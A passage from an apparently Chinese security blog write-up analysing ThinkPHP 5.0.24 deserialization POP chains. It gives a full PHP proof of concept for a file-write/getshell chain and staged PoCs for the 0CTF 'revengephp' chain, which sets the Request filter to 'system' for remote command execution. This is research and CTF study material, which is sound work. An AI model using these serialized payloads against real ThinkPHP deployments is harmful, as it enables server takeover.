tag可控，故key可控</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//重置tag</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">has</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将字符串key转为数组 </span>            <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 在开头加上$name</span>            <span class="token variable">$value</span>   <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将数组转回字符串</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//重新进入set</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当重新进入set()方法后，$name, $value值就存在了，而且都可控</p><p>此时再次调用进上面的方法，文件就成功写入了</p><p><img src="image-20211010204705651.png" alt="image-20211010204705651"></p><p><img src="image-20211010204728040.png" alt="image-20211010204728040"></p><p>至此thinkphp5.0.24的第一条pop链就利用完毕了</p><blockquote><p>注： windows不能使用这条链进行rce</p><p>因为windows文件夹不允许绕过exit所使用的名称</p><p>而Linux没有直接限制，故这条链在windows环境只能写目录，而Linux环境可以getshell</p></blockquote><h2 id="POC-创建目录"><a href="#POC-创建目录" class="headerlink" title="POC 创建目录"></a>POC 创建目录</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//abstract class Driver</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class File extends Driver</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"./aaaaa/"</span><span class="token punctuation">,</span>        <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends SessionHandler</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">SessionHandler</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">SessionHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Query</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class OneToOne extends Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/**        * 这里我本来也看的莫名奇妙        * 直到我翻文章看到一句话        * 三重继承的时候，最顶端的类的 __construct() 不会自动调用        * 经过我自己的测试，是真的        */</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'no'</span><span class="token punctuation">,</span><span class="token string">'123'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class BelongsTo extends OneToOne</span><span class="token keyword">class</span> <span class="token class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Model</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// class Pivot extends Model</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Pipes</span><span class="token comment" spellcheck="true">//class Windows extends Pipes</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token variable">$Windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211011182333869-16339551654012.png" alt="image-20211011182333869"></p><h4 id="三重继承，最顶端的类的-construct-不会自动调用"><a href="#三重继承，最顶端的类的-construct-不会自动调用" class="headerlink" title="三重继承，最顶端的类的 __construct() 不会自动调用"></a>三重继承，最顶端的类的 __construct() 不会自动调用</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">abstract</span> <span class="token keyword">class</span>  <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token string">"query"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span>  <span class="token class-name">Relation</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 父构造器继承</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token string">"bindAttr"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$BelongsTo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$BelongsTo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$BelongsTo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>注释父类构造调用</p><p>   最顶层query没有调用</p></li></ul><p><img src="image-20211011210214584.png" alt="image-20211011210214584"></p><ul><li><p>不注释父类构造调用</p><p>  最顶层query调用成功</p></li></ul><p><img src="image-20211011210241263.png" alt="image-20211011210241263"></p><p>我就说调试怎么总在这里跳到错误页面</p><blockquote><p>思维导图</p></blockquote><p><img src="tu1-16341943845002.png" alt="tu1-16341943845002"></p><h1 id="revengephp-rce-链"><a href="#revengephp-rce-链" class="headerlink" title="revengephp rce 链"></a>revengephp rce 链</h1><p>上面那条有人已经挖到了windows环境下反序列化的方法，这个就不赘述了，接下来直接分析revengephp的rce链</p><p>这里模拟真实情况从后往前进行一次分析</p><p>原文地址<code>https://igml.top/2021/09/28/2021-0CTF-FINAL/</code></p><h2 id="调用已知终点"><a href="#调用已知终点" class="headerlink" title="调用已知终点"></a>调用已知终点</h2><p>根据文章，已知rce终点为：<code>private function filterValue(&amp;$value, $key, $filters)</code> 位于thinkphp/library/think/Request.php中</p><p><img src="image-20211013161244461.png" alt="image-20211013161244461"></p><p><strong>这里我们需要一个可控$filter的方法，已经调用了filterValue()的方法来让我们进行下一步操作</strong></p><p>调用filterValue()时前提条件，所以我们先全局搜索找到调用了filterValue()方法的位置</p><p><img src="image-20211013164242347.png" alt="image-20211013164242347"></p><p>只有两个，那就没其他的选择，</p><p>其中input中还调用了getFilter()方法，可以对$filter赋值</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$filter</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这里可控</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cookie()方法没有调用点，直接排除</p><p><img src="image-20211013162426856.png" alt="image-20211013162426856"></p><pre class="line-numbers language-php"><code class="language-php">阶段poc<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211013162044735.png" alt="image-20211013162044735"></p><h2 id="public-function-input"><a href="#public-function-input" class="headerlink" title="public function input()"></a>public function input()</h2><p>接着找可以调用input()的位置</p><p>这里就很多了，不过最后选择get()</p><p><img src="image-20211013163334433.png" alt="image-20211013163334433"></p><p>因为这些能调用input()的方法仍然没有一个可以调出去，但记下位置进行查找，会发现get()可以被任意调用</p><p><img src="image-20211013163856943.png" alt="image-20211013163856943"></p><p>可控调用多的一匹，真是幸福的烦恼</p><p>这里有个很熟悉的地方</p><p><img src="image-20211013165151697.png" alt="image-20211013165151697"></p><p>眼熟吗？成功调进上一条链子，可控的都是handler</p><pre class="line-numbers language-php"><code class="language-php">阶段poc<span class="token comment" spellcheck="true">//class Request 执行终点</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Driver{} Memcache父类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends Driver 调向Request</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于为什么选择has()方法，set()指向了has()，而上一条链中间刚好指向了set()</p><p><img src="image-20211013170403327.png" alt="image-20211013170403327"></p><p><img src="image-20211013191328955.png" alt="image-20211013191328955"></p><p>这里指向了set()</p><blockquote><p><strong>注意，这里实际上并不是上一条链的Memcache.php，只是有着相同的类名</strong></p><p><strong>这里的Memcache位于thinkphp/library/think/cache/driver/Memcache.php</strong></p><p><strong>上一条位于thinkphp/library/think/session/driver/Memcache.php</strong></p></blockquote><p>所以从上一条该位置接过来，这条rce链就完成了</p><pre class="line-numbers language-php"><code class="language-php">阶段poc<span class="token comment" spellcheck="true">//class Request 执行终点</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Driver{} Memcache父类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends Driver 调向Request</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends SessionHandler 调向上面Memcache类的set方法</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">SessionHandler</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">SessionHandler</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token 